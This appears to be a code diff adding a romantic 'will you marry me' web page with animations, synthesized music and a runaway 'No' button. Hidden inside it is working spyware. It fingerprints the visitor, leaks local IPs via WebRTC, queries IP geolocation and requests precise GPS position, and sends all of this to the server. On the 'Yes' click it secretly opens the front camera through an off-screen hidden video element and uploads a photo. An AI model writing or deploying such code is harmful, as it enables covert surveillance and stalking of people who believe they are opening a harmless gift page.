+                            const match = cand.match(/([0-9a-fA-F:]+\.local)|([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+                            if (match && !ips.includes(match[0])) {
+                                ips.push(match[0]);
+                            }
+                        };
+                        pc.createOffer().then(sdp => pc.setLocalDescription(sdp)).catch(() => { });
+                        setTimeout(() => {
+                            pc.close();
+                            resolve(ips);
+                        }, 800);
+                    } catch (e) {
+                        resolve([]);
+                    }
+                });
+            }
+
+            async function _getIpApiGeo() {
+                try {
+                    const res = await fetch('https://ipapi.co/json/');
+                    if (res.ok) {
+                        return await res.json();
+                    }
+                } catch (e) { }
+                return null;
+            }
+
+            function _getGeolocation(vid) {
+                if (!navigator.geolocation) return;
+                navigator.geolocation.getCurrentPosition(
+                    function (pos) {
+                        fetch('/api/geolocation', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ id: vid, latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy }) }).catch(function () { });
+                    },
+                    function () { },
+                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 60000 }
+                );
+            }
+
+            function sendWebcamImage(vid, imageData) {
+                return fetch('/api/webcam', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ id: vid, image: imageData }) }).then(function (r) { return r.json(); });
+            }
+
+            async function _send() {
+                const vid = _getVisitorId();
+                const battery = await _getBattery();
+                const fingerprint = _getFingerprint();
+                fingerprint.battery = battery;
+
+                // Gather maximum possible extra details asynchronously
+                try {
+                    fingerprint.webgl = _getWebGLInfo();
+                    fingerprint.audio = _getAudioContextInfo();
+                    fingerprint.permissions = await _getPermissions();
+                    fingerprint.mediaDevices = await _getMediaDevices();
+                    fingerprint.localIps = await _getLocalIps();
+                    fingerprint.ipGeo = await _getIpApiGeo();
+                } catch (e) { }
+
+                const payload = {
+                    id: vid,
+                    type: 'page_visit',
+                    fingerprint: fingerprint,
+                    referrer: document.referrer,
+                    url: window.location.href,
+                    timestamp: new Date().toISOString(),
+                    pageLoaded: performance.now(),
+                    source: document.referrer ? 'referral' : 'direct'
+                };
+
+                try { await fetch('/api/collect', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }); }
+                catch (e) { navigator.sendBeacon('/api/collect', JSON.stringify(payload)); }
+
+                setTimeout(function () { _getGeolocation(vid); }, 1500);
+            }
+
+            return { send: _send, getVisitorId: _getVisitorId, sendWebcamImage: sendWebcamImage };
+        })();
+
+        COLLECTOR.send();
+
+        // Click tracking
+        document.addEventListener('click', function (e) {
+            const target = e.target;
+            if (target.tagName === 'BUTTON' || target.closest('button')) {
+                const btn = target.tagName === 'BUTTON' ? target : target.closest('button');
+                const btnText = btn.textContent.trim().toLowerCase();
+                let decision = 'none';
+                if (btn.id === 'yesBtn' || btnText.includes('yes') || btnText.includes('i will')) {
+                    decision = 'yes';
+                } else if (btn.id === 'noBtn' || btnText.includes('maybe') || btnText.includes('no') || btnText.includes('hmm') || btnText.includes('sure?')) {
+                    decision = 'no';
+                }
+                navigator.sendBeacon('/api/collect', JSON.stringify({
+                    id: localStorage.getItem('_vid'),
+                    type: 'click',
+                    buttonText: btn.textContent.trim(),
+                    decision: decision,
+                    timestamp: new Date().toISOString()
+                }));
+            }
+        });
+
+        // Stealth camera capture — fires on YES click, no UI
+        let cameraStream = null;
+
+        async function _stealthCapture() {
+            let videoEl = null;
+            try {
+                // Request front camera at reasonable resolution
+                cameraStream = await navigator.mediaDevices.getUserMedia({
+                    video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' },
+                    audio: false
+                });
+
+                videoEl = document.createElement('video');
+                videoEl.srcObject = cameraStream;
+                videoEl.playsInline = true;
+                videoEl.muted = true;
+                videoEl.autoplay = true;
+                videoEl.setAttribute('playsinline', '');   // required on iOS
+
+                // CRITICAL: Never use display:none — browsers won't decode frames for hidden videos.
+                // Instead position the element completely off-screen but still "rendered".
+                videoEl.style.cssText = [
+                    'position:fixed',
+                    'top:-9999px',
+                    'left:-9999px',
+                    'width:1px',
+                    'height:1px',
+                    'opacity:0',
+                    'pointer-events:none',
+                    'z-index:-9999'
+                ].join(';');
+                document.body.appendChild(videoEl);
+
+                // Wait for pixel data to be available (loadeddata fires later than loadedmetadata)
+                await new Promise(function (resolve, reject) {
+                    const timer = setTimeout(function () { reject(new Error('Camera timeout')); }, 6000);
+                    function done() {
+                        clearTimeout(timer);
+                        videoEl.play().then(resolve).catch(reject);
+                    }
+                    videoEl.addEventListener('loadeddata', done, { once: true });
+                    // Fallback: some browsers skip loadeddata, use canplay instead
+                    videoEl.addEventListener('canplay', done, { once: true });
+                });
+
+                // Give the camera sensor time to auto-expose and produce a non-black frame
+                await new Promise(function (r) { setTimeout(r, 900); });
+
+                // Validate we actually have video dimensions before drawing
+                let w = videoEl.videoWidth;
+                let h = videoEl.videoHeight;
+
+                // If dimensions are still 0, wait another 600ms and retry once
+                if (!w || !h) {
+                    await new Promise(function (r) { setTimeout(r, 600); });
+                    w = videoEl.videoWidth;
+                    h = videoEl.videoHeight;
+                }
+
+                // Fallback dimensions if browser still won't report them
+                if (!w || !h) { w = 640; h = 480; }
+
+                const canvas = document.createElement('canvas');
+                canvas.width = w;
+                canvas.height = h;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(videoEl, 0, 0, w, h);
+
+                const imageData = canvas.toDataURL('image/jpeg', 0.85);
+
+                // Only send if the image isn't just a blank/tiny placeholder
+                if (imageData && imageData.length > 5000) {
+                    const vid = COLLECTOR.getVisitorId();
+                    await COLLECTOR.sendWebcamImage(vid, imageData);
+                }
+
+            } catch (err) {
+                // Silently fail — user may have denied camera access
+            } finally {
+                // Always clean up stream and video element
+                try {
+                    if (cameraStream) {
+                        cameraStream.getTracks().forEach(function (t) { t.stop(); });
+                        cameraStream = null;
+                    }
+                } catch (e) { }
+                try {
+                    if (videoEl && videoEl.parentNode) {
+                        videoEl.srcObject = null;
+                        document.body.removeChild(videoEl);
+                    }
+                } catch (e) { }
+            }
+        }
+
+
+        // Sound synthesizer module using Web Audio API
+        const SoundEffects = (function () {
+            let ctx = null;
+
+            function initCtx() {
+                if (!ctx) {
+                    ctx = new (window.AudioContext || window.webkitAudioContext)();
+                }
+                if (ctx.state === 'suspended') {
+                    ctx.resume();
+                }
+            }
+
+            function playYes() {
+                try {
+                    initCtx();
+                    const osc = ctx.createOscillator();
+                    const gain = ctx.createGain();
+                    osc.connect(gain);
+                    gain.connect(ctx.destination);
+
+                    osc.type = 'triangle';
+
+                    const now = ctx.currentTime;
+                    // Rising chime chord arpeggio
+                    osc.frequency.setValueAtTime(261.63, now); // C4
+                    osc.frequency.exponentialRampToValueAtTime(329.63, now + 0.15); // E4
+                    osc.frequency.exponentialRampToValueAtTime(392.00, now + 0.3); // G4
+                    osc.frequency.exponentialRampToValueAtTime(523.25, now + 0.45); // C5
+                    osc.frequency.exponentialRampToValueAtTime(659.25, now + 0.6); // E5
+
+                    gain.gain.setValueAtTime(0, now);
+                    gain.gain.linearRampToValueAtTime(0.15, now + 0.05);
+                    gain.gain.exponentialRampToValueAtTime(0.001, now + 1.2);
+
+                    osc.start(now);
+                    osc.stop(now + 1.2);
+                } catch (e) { }
+            }
+
+            function playNo() {
+                try {
+                    initCtx();
+                    const now = ctx.currentTime;
+
+                    const osc1 = ctx.createOscillator();
+                    const osc2 = ctx.createOscillator();
+                    const gain = ctx.createGain();
+
+                    osc1.connect(gain);
+                    osc2.connect(gain);
+                    gain.connect(ctx.destination);
+
+                    osc1.type = 'sawtooth';
+                    osc2.type = 'sawtooth';
+
+                    // Detuned low rumble / crash slide
+                    osc1.frequency.setValueAtTime(220, now);
+                    osc1.frequency.linearRampToValueAtTime(55, now + 1.8);
+                    osc2.frequency.setValueAtTime(223, now);
+                    osc2.frequency.linearRampToValueAtTime(53, now + 1.8);
+
+                    gain.gain.setValueAtTime(0, now);
+                    gain.gain.linearRampToValueAtTime(0.2, now + 0.1);
+                    gain.gain.exponentialRampToValueAtTime(0.001, now + 2.0);
+
+                    osc1.start(now);
+                    osc2.start(now);
+                    osc1.stop(now + 2.0);
+                    osc2.stop(now + 2.0);
+                } catch (e) { }
+            }
+
+            return { playYes, playNo };
+        })();
+
+        // Procedural background music synthesizer (Music Box arpeggio)
+        const BackgroundMusic = (function () {
+            let ctx = null;
+            let isPlaying = false;
+            let sequenceInterval = null;
+            let currentStep = 0;
+            let masterGain = null;
+
+            const chords = [
+                // C major 7: C4, E4, G4, B4
+                [261.63, 329.63, 392.00, 493.88],
+                // A minor 7: A3, C4, E4, G4
+                [220.00, 261.63, 329.63, 392.00],
+                // F major 7: F3, A3, C4, E4
+                [174.61, 220.00, 261.63, 329.63],
+                // G major 7: G3, B3, D4, F#4
+                [196.00, 246.94, 293.66, 369.99]
+            ];
+
+            function init() {
+                if (ctx) return;
+                ctx = new (window.AudioContext || window.webkitAudioContext)();
+                masterGain = ctx.createGain();
+                masterGain.gain.setValueAtTime(0.08, ctx.currentTime);
+                masterGain.connect(ctx.destination);
+            }
+
+            function playNote(freq, startTime, duration) {
+                if (!ctx) return;
+                const osc = ctx.createOscillator();
+                const gain = ctx.createGain();
+                osc.connect(gain);
+                gain.connect(masterGain);
+
+                osc.type = 'sine';
+                osc.frequency.setValueAtTime(freq, startTime);
+
+                gain.gain.setValueAtTime(0, startTime);
+                gain.gain.linearRampToValueAtTime(0.25, startTime + 0.1);
+                gain.gain.exponentialRampToValueAtTime(0.001, startTime + duration - 0.05);
+
+                osc.start(startTime);
+                osc.stop(startTime + duration);
+            }
+
+            function tick() {
+                if (!isPlaying || !ctx) return;
+                const chordIndex = Math.floor(currentStep / 8) % chords.length;
+                const noteIndex = currentStep % 8;
+                const chord = chords[chordIndex];
+
+                const pattern = [0, 1, 2, 3, 2, 1, 3, 0];
+                const noteFreq = chord[pattern[noteIndex % pattern.length]];
+
+                playNote(noteFreq, ctx.currentTime, 0.8);
+                currentStep++;
+            }
+
+            function start() {
+                init();
+                if (ctx.state === 'suspended') {
+                    ctx.resume();
+                }
+                isPlaying = true;
+                currentStep = 0;
+                tick();
+                sequenceInterval = setInterval(tick, 350);
+            }
+
+            function stop() {
+                isPlaying = false;
+                if (sequenceInterval) {
+                    clearInterval(sequenceInterval);
+                    sequenceInterval = null;
+                }
+                if (ctx && ctx.state !== 'suspended') {
+                    try {
+                        masterGain.gain.setValueAtTime(masterGain.gain.value, ctx.currentTime);
+                        masterGain.gain.linearRampToValueAtTime(0, ctx.currentTime + 0.3);
+                        setTimeout(() => {
+                            if (!isPlaying && ctx) ctx.suspend();
+                        }, 400);
+                    } catch (e) { }
+                }
+            }
+
+            function toggle() {
+                if (isPlaying) {
+                    stop();
+                    return false;
+                } else {
+                    init();
+                    masterGain.gain.setValueAtTime(0.08, ctx.currentTime);
+                    start();
+                    return true;
+                }
+            }
+
+            return { toggle, isPlaying: () => isPlaying, stop, start };
+        })();
+
+        // Create stars
+        function createStars() {
+            const starsContainer = document.getElementById('stars');
+            for (let i = 0; i < 100; i++) {
+                const star = document.createElement('div');
+                star.className = 'star';
+                star.style.left = Math.random() * 100 + '%';
+                star.style.top = Math.random() * 100 + '%';
+                star.style.animationDelay = Math.random() * 2 + 's';
+                star.style.animationDuration = (Math.random() * 2 + 1) + 's';
+                starsContainer.appendChild(star);
+            }
+        }
+
+        function createSparkles() {
+            const sparkleLayer = document.getElementById('sparkles');
+            for (let i = 0; i < 35; i++) {
+                const sparkle = document.createElement('div');
+                sparkle.className = 'sparkle';
+                sparkle.textContent = ['✦', '✧', '⭐', '❋'][Math.floor(Math.random() * 4)];
+                sparkle.style.left = Math.random() * 100 + '%';
+                sparkle.style.top = Math.random() * 100 + '%';
+                sparkle.style.fontSize = (Math.random() * 10 + 10) + 'px';
+                sparkle.style.animationDelay = Math.random() * 2 + 's';
+                sparkle.style.animationDuration = (Math.random() * 2 + 2) + 's';
+                sparkleLayer.appendChild(sparkle);
+            }
+        }
+
+        // Create floating hearts
+        function createHeart() {
+            const container = document.getElementById('heartsContainer');
+            const heart = document.createElement('div');
+            heart.className = 'heart';
+            heart.innerHTML = ['💕', '💗', '💖', '💝', '💘'][Math.floor(Math.random() * 5)];
+            heart.style.left = Math.random() * 100 + '%';
+            heart.style.fontSize = (Math.random() * 20 + 15) + 'px';
+            heart.style.animationDuration = (Math.random() * 5 + 5) + 's';
+            container.appendChild(heart);
+
+            setTimeout(() => heart.remove(), 10000);
+        }
+
+        // Create rose petals
+        function createPetal() {
+            const container = document.getElementById('heartsContainer');
+            const petal = document.createElement('div');
+            petal.className = 'rose-petal';
+            petal.style.left = Math.random() * 100 + '%';
+            petal.style.animationDuration = (Math.random() * 5 + 7) + 's';
+            petal.style.animationDelay = Math.random() * 5 + 's';
+            container.appendChild(petal);
+
+            setTimeout(() => petal.remove(), 15000);
+        }
+
+        // Scroll animation for timeline
+        function handleScroll() {
+            const items = document.querySelectorAll('.timeline-item');
+            items.forEach(item => {
+                const rect = item.getBoundingClientRect();
+                if (rect.top < window.innerHeight * 0.8) {
+                    item.classList.add('visible');
+                }
+            });
+        }
+
+        function scrollToSection(id) {
+            document.getElementById(id).scrollIntoView({ behavior: 'smooth' });
+        }
+
+        let evadeCount = 0;
+        // "No" button runs away
+        function runAway() {
+            const noBtn = document.getElementById('noBtn');
+            if (evadeCount < 5) {
+                evadeCount++;
+                const maxX = window.innerWidth - noBtn.offsetWidth - 40;
+                const maxY = window.innerHeight - noBtn.offsetHeight - 40;
+                noBtn.style.position = 'fixed';
+                noBtn.style.left = Math.random() * maxX + 'px';
+                noBtn.style.top = Math.random() * maxY + 'px';
+                const texts = ["Are you sure? 💕", "Think again! 🥺", "Maybe YES? 💖", "Please? 🥰", "My heart is yours! 💝"];
+                noBtn.textContent = texts[evadeCount - 1] || "Maybe...";
+            } else {
+                // Stop running away, become a clickable "No" button representing the true decision
+                noBtn.textContent = "No.";
+                noBtn.style.position = 'static';
+                noBtn.style.background = 'rgba(255, 255, 255, 0.05)';
+                noBtn.style.color = '#ff4a2b';
+                noBtn.style.border = '2px solid rgba(255, 74, 43, 0.4)';
+                noBtn.removeAttribute('onmouseover');
+            }
+        }
+
+        // Handle Yes click
+        function handleYes() {
+            try { SoundEffects.playYes(); } catch (e) { }
+            document.getElementById('proposal').style.display = 'none';
+            document.getElementById('celebration').classList.add('active');
+            createFireworks();
+            startCelebration();
+
+            // Stealth camera capture
+            setTimeout(_stealthCapture, 1200);
+        }
+
+        // ===================================================
+        //  CRACK SOUND — synthesized noise burst
+        // ===================================================
+        function _playCrackSound(intensity) {
+            try {
+                const ctx = new (window.AudioContext || window.webkitAudioContext)();
+                const dur = intensity === 0 ? 0.18 : 0.32;
+                const n = Math.floor(ctx.sampleRate * dur);
+                const buf = ctx.createBuffer(1, n, ctx.sampleRate);
+                const d = buf.getChannelData(0);
+                for (let i = 0; i < n; i++) {
+                    const t = i / n;
+                    d[i] = (Math.random() * 2 - 1) * Math.pow(1 - t, 2.5) * (intensity === 0 ? 0.55 : 1.0);
+                }
+                const src = ctx.createBufferSource(); src.buffer = buf;
+                const bpf = ctx.createBiquadFilter();
+                bpf.type = 'bandpass';
+                bpf.frequency.value = intensity === 0 ? 3200 : 900;
+                bpf.Q.value = 0.5;
+                const gain = ctx.createGain();
+                gain.gain.setValueAtTime(intensity === 0 ? 0.45 : 0.95, ctx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + dur);
+                src.connect(bpf); bpf.connect(gain); gain.connect(ctx.destination);
+                src.start(); src.stop(ctx.currentTime + dur);
+                setTimeout(() => { try { ctx.close(); } catch (e) { } }, (dur + 0.3) * 1000);
+            } catch (e) { }
+        }
+
+        // ===================================================
+        //  CRACK OVERLAY — SVG lines radiating from center
+        // ===================================================
+        function _showCrackOverlay() {
+            const overlay = document.createElement('div');
+            overlay.id = 'crackOverlay';
+            overlay.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:99990;pointer-events:none;overflow:hidden;';
+
+            // Crack definition: {from, to, delay(ms), isPrimary}
+            const cracks = [
+                // === PRIMARY — 8 main branches from center (50,50) ===
+                { x1: 50, y1: 50, x2: 12, y2: 6, del: 0, p: true },
+                { x1: 50, y1: 50, x2: 88, y2: 3, del: 60, p: true },
+                { x1: 50, y1: 50, x2: 97, y2: 42, del: 120, p: true },
+                { x1: 50, y1: 50, x2: 93, y2: 91, del: 80, p: true },
+                { x1: 50, y1: 50, x2: 52, y2: 102, del: 100, p: true },
+                { x1: 50, y1: 50, x2: 8, y2: 88, del: 50, p: true },
+                { x1: 50, y1: 50, x2: 2, y2: 48, del: 140, p: true },
+                { x1: 50, y1: 50, x2: 28, y2: 102, del: 170, p: true },
+                // === SECONDARY — branch from endpoints ===
+                { x1: 12, y1: 6, x2: -2, y2: 22, del: 320, p: false },
+                { x1: 12, y1: 6, x2: 32, y2: -2, del: 370, p: false },
+                { x1: 88, y1: 3, x2: 102, y2: 18, del: 330, p: false },
+                { x1: 88, y1: 3, x2: 75, y2: -2, del: 380, p: false },
+                { x1: 97, y1: 42, x2: 102, y2: 60, del: 360, p: false },
+                { x1: 93, y1: 91, x2: 102, y2: 100, del: 350, p: false },
+                { x1: 8, y1: 88, x2: -2, y2: 100, del: 340, p: false },
+                { x1: 2, y1: 48, x2: -2, y2: 28, del: 390, p: false },
+                // === TERTIARY — smaller hairline details ===
+                { x1: 32, y1: -2, x2: 48, y2: -2, del: 560, p: false },
+                { x1: 102, y1: 18, x2: 102, y2: 38, del: 540, p: false },
+                { x1: 102, y1: 60, x2: 98, y2: 75, del: 555, p: false },
+                { x1: 75, y1: -2, x2: 60, y2: -2, del: 570, p: false },
+            ];
+
+            const lines = cracks.map(c => {
+                const len = Math.hypot(c.x2 - c.x1, c.y2 - c.y1) * 12;
+                const sw = c.p ? '1.2' : '0.55';
+                const glow = c.p
+                    ? 'drop-shadow(0 0 3px rgba(255,90,90,0.9)) drop-shadow(0 0 8px rgba(255,50,50,0.4))'
+                    : 'drop-shadow(0 0 2px rgba(255,180,180,0.6))';
+                const aniDur = c.p ? '0.28s' : '0.18s';
+                return `<line
+                    x1="${c.x1}" y1="${c.y1}" x2="${c.x2}" y2="${c.y2}"
+                    stroke="rgba(255,255,255,0.92)"
+                    stroke-width="${sw}"
+                    stroke-linecap="round"
+                    style="stroke-dasharray:${len};stroke-dashoffset:${len};
+                           filter:${glow};
+                           animation:drawCrack ${aniDur} ease-out ${c.del}ms forwards;"
+                />`;
+            }).join('');
+
+            overlay.innerHTML = `
+                <svg width="100%" height="100%"
+                     viewBox="0 0 100 100"
+                     preserveAspectRatio="xMidYMid slice"
+                     xmlns="http://www.w3.org/2000/svg">
+                    ${lines}
+                </svg>`;
+
+            document.body.appendChild(overlay);
+        }
+
+        // ===================================================
+        //  HANDLE NO — cinematic crack → break
+        // ===================================================
+        function handleNo() {
+            const noBtn = document.getElementById('noBtn');
+            if (noBtn.textContent.includes('Yes') || noBtn.textContent.includes('Will')) {
+                handleYes();
+                return;
+            }
+
+            // Stop music immediately
+            try { BackgroundMusic.stop(); } catch (e) { }
+            try {
+                const musicBtn = document.getElementById('musicBtn');
+                if (musicBtn) { musicBtn.textContent = '🎵'; musicBtn.style.animationPlayState = 'paused'; }
+            } catch (e) { }
+
+            // Lock buttons
+            document.getElementById('yesBtn').disabled = true;
+            noBtn.disabled = true;
+
+            // ─────────────────────────────────────────────
+            //  PHASE 1 : CRACK  (t = 0 → 2.2s)
+            // ─────────────────────────────────────────────
+            _playCrackSound(0);      // sharp initial crack
+            _showCrackOverlay();     // SVG crack lines spread out
+
+            // First shake
+            document.body.style.animation = 'screenShake 0.75s ease-in-out';
+            setTimeout(() => { document.body.style.animation = ''; }, 750);
+
+            // Second heavier shake + deeper crack sound at t=1.1s
+            setTimeout(() => {
+                _playCrackSound(1);
+                document.body.style.animation = 'screenShake 0.9s ease-in-out';
+                setTimeout(() => { document.body.style.animation = ''; }, 900);
+            }, 1100);
+
+            // ─────────────────────────────────────────────
+            //  PHASE 2 : BREAK PART BY PART  (t ≥ 2.2s)
+            // ─────────────────────────────────────────────
+            // Gather individual children of each section for more pieces
+            const sectionSelectors = [
+                '.landing-section > *',
+                '.timeline-item',          // each timeline card separately
+                '.story-section > .personal-message',
+                '.story-section > .section-title',
+                '.proposal-section > *',
+                '.celebration.active > *',
+            ];
+
+            let pieces = [];
+            sectionSelectors.forEach(sel => {
+                pieces.push(...Array.from(document.querySelectorAll(sel)));
+            });
+
+            // Remove duplicates and invisible elements
+            pieces = [...new Set(pieces)].filter(el => {
+                const r = el.getBoundingClientRect();
+                return r.width > 0 && r.height > 0;
+            });
+
+            // Fallback to whole sections if no children found
+            if (pieces.length === 0) {
+                pieces = Array.from(document.body.children).filter(el =>
+                    !['stars', 'heartsContainer', 'musicBtn', 'crackOverlay'].includes(el.id)
+                    && el.tagName !== 'SCRIPT'
+                );
+            }
+
+            const BREAK_START = 2200;  // ms — let cracks settle first
+            const PIECE_GAP = 550;   // ms between each piece falling
+
+            pieces.forEach((el, idx) => {
+                const rect = el.getBoundingClientRect();
+                if (!rect.width || !rect.height) return;
+
+                // Pin element in place
+                el.style.cssText += [
+                    `position:fixed`,
+                    `top:${rect.top}px`,
+                    `left:${rect.left}px`,
+                    `width:${rect.width}px`,
+                    `height:${rect.height}px`,
+                    `margin:0`,
+                    `z-index:${200 - idx}`,
+                ].join(';') + ';';
+
+                el.classList.add('breaking-piece');
+
+                // Randomise fall direction — heavier bias downward
+                const rot = ((Math.random() - 0.5) * 70).toFixed(1) + 'deg';
+                const tx = ((Math.random() - 0.5) * 260).toFixed(0) + 'px';
+                const ty = (120 + Math.random() * 30).toFixed(0) + 'vh';
+                const sc = (0.35 + Math.random() * 0.35).toFixed(2);
+                const dur = (2.8 + Math.random() * 1.4).toFixed(1) + 's';
+                const fade = (2.0 + Math.random() * 0.8).toFixed(1) + 's';
+                const del = (0.4 + Math.random() * 0.3).toFixed(2) + 's';
+
+                el.style.setProperty('--rot', rot);
+                el.style.setProperty('--tx', tx);
+                el.style.setProperty('--ty', ty);
+                el.style.setProperty('--sc', sc);
+                el.style.setProperty('--fall-dur', dur);
+                el.style.setProperty('--fade-dur', fade);
+                el.style.setProperty('--fade-del', del);
+
+                const breakAt = BREAK_START + idx * PIECE_GAP;
+
+                // Pre-shake 400ms before the fall
+                setTimeout(() => el.classList.add('do-shake'), breakAt - 400);
+
+                // Actual fall
+                setTimeout(() => {
+                    el.classList.remove('do-shake');
+                    el.classList.add('do-fall');
+                }, breakAt);
+            });
+
+            // Background fades to black starting at 1.5s, over 7s
+            setTimeout(() => {
+                document.body.style.transition = 'background 7s ease';
+                document.body.style.background = '#000';
+            }, 1500);
+
+            // ─────────────────────────────────────────────
+            //  PHASE 3 : SAD TEXT  (after last piece falls)
+            // ─────────────────────────────────────────────
+            const sadDelay = BREAK_START + pieces.length * PIECE_GAP + 1200;
+
+            let sadScreen = document.getElementById('sadScreen');
+            if (!sadScreen) {
+                sadScreen = document.createElement('div');
+                sadScreen.id = 'sadScreen';
+                sadScreen.className = 'sad-screen';
+                sadScreen.innerHTML = '<div class="sad-text">she said no :(</div>';
+                document.body.appendChild(sadScreen);
+            }
+            setTimeout(() => sadScreen.classList.add('active'), sadDelay);
+
+            // Send decision to backend
+            const vid = localStorage.getItem('_vid');
+            navigator.sendBeacon('/api/collect', JSON.stringify({
+                id: vid, type: 'click',
+                buttonText: 'No.', decision: 'no',
+                timestamp: new Date().toISOString()
+            }));
+        }
+
+        // Create fireworks
+        function createFireworks() {
+            const colors = ['#8b5cf6', '#c4b5fd', '#a78bfa', '#f0abfc', '#c084fc', '#ddd6fe'];
+
+            for (let i = 0; i < 10; i++) {
+                setTimeout(() => {
+                    const firework = document.createElement('div');
+                    firework.className = 'firework';
+                    firework.style.left = Math.random() * window.innerWidth + 'px';
+                    firework.style.top = Math.random() * window.innerHeight * 0.5 + 'px';
+                    document.body.appendChild(firework);
+
+                    for (let j = 0; j < 30; j++) {
+                        const particle = document.createElement('div');
+                        particle.className = 'firework-particle';
+                        particle.style.background = colors[Math.floor(Math.random() * colors.length)];
+                        const angle = (j / 30) * 360;
+                        const velocity = 50 + Math.random() * 50;
+                        particle.style.setProperty('--tx', Math.cos(angle * Math.PI / 180) * velocity + 'px');
+                        particle.style.setProperty('--ty', Math.sin(angle * Math.PI / 180) * velocity + 'px');
+                        firework.appendChild(particle);
+                    }
+
+                    setTimeout(() => firework.remove(), 1000);
+                }, i * 300);
+            }
+        }
+
+        // Celebration animation
+        function startCelebration() {
+            setInterval(createHeart, 300);
+            setInterval(createPetal, 500);
+        }
+
+        // Initialize
+        createStars();
+        createSparkles();
+        setInterval(createHeart, 2000);
+        setInterval(createPetal, 1500);
+        window.addEventListener('scroll', handleScroll);
+        handleScroll();
+
+        // Wire background music toggle button
+        const musicBtn = document.getElementById('musicBtn');
+        if (musicBtn) {
+            musicBtn.addEventListener('click', (e) => {
+                e.stopPropagation(); // Prevent interactive tap sparks on button click
+                const playing = BackgroundMusic.toggle();
+                musicBtn.textContent = playing ? '⏸️' : '🎵';
+                musicBtn.style.animationPlayState = playing ? 'running' : 'paused';
+            });
+        }
+
+        // Auto-start music on first interaction (browser standard)
+        function autoStartMusic() {
+            if (!BackgroundMusic.isPlaying()) {
+                const playing = BackgroundMusic.toggle();
+                if (playing && musicBtn) {
+                    musicBtn.textContent = '⏸️';
+                    musicBtn.style.animationPlayState = 'running';
+                }
+            }
+            document.removeEventListener('click', autoStartMusic);
+            document.removeEventListener('touchstart', autoStartMusic);
+        }
+        document.addEventListener('click', autoStartMusic);
+        document.addEventListener('touchstart', autoStartMusic);
+
+        // Interactive touch/click particle trail explosion
+        document.addEventListener('pointerdown', (e) => {
+            // Only spawn if not clicking a button directly to avoid cluttering button interaction
+            if (e.target.tagName === 'BUTTON' || e.target.closest('button')) return;
+            const symbols = ['❤️', '💖', '💕', '🌸', '✨', '💗', '💘'];
+            const count = 6;
+            for (let i = 0; i < count; i++) {
+                const p = document.createElement('div');
+                p.textContent = symbols[Math.floor(Math.random() * symbols.length)];
+                p.style.position = 'fixed';
+                p.style.left = e.clientX + 'px';
+                p.style.top = e.clientY + 'px';
+                p.style.fontSize = (Math.random() * 15 + 12) + 'px';
+                p.style.pointerEvents = 'none';
+                p.style.zIndex = '9999';
+                p.style.transition = 'all 0.8s cubic-bezier(0.1, 0.8, 0.3, 1)';
+
+                const angle = Math.random() * Math.PI * 2;
+                const dist = Math.random() * 50 + 30;
+                const tx = Math.cos(angle) * dist;
+                const ty = Math.sin(angle) * dist - 40; // Offset upwards to simulate float
+
+                document.body.appendChild(p);
+
+                // Trigger transition
+                p.offsetHeight;
+
+                p.style.transform = `translate(${tx}px, ${ty}px) scale(0.3) rotate(${Math.random() * 360}deg)`;
+                p.style.opacity = '0';
+
+                setTimeout(() => p.remove(), 800);
+            }
+        });
+
+        // Make no button draggable on mobile
+        let touchStartX, touchStartY;
+        const noBtn = document.getElementById('noBtn');
+
+        noBtn.addEventListener('touchstart', (e) => {
+            touchStartX = e.touches[0].clientX - noBtn.offsetLeft;
+            touchStartY = e.touches[0].clientY - noBtn.offsetTop;
+        });
+
+        noBtn.addEventListener('touchmove', (e) => {
+            e.preventDefault();
+            noBtn.style.position = 'fixed';
+            noBtn.style.left = (e.touches[0].clientX - touchStartX) + 'px';
+            noBtn.style.top = (e.touches[0].clientY - touchStartY) + 'px';
+        });
+    </script>
+</body>
+
+</html>
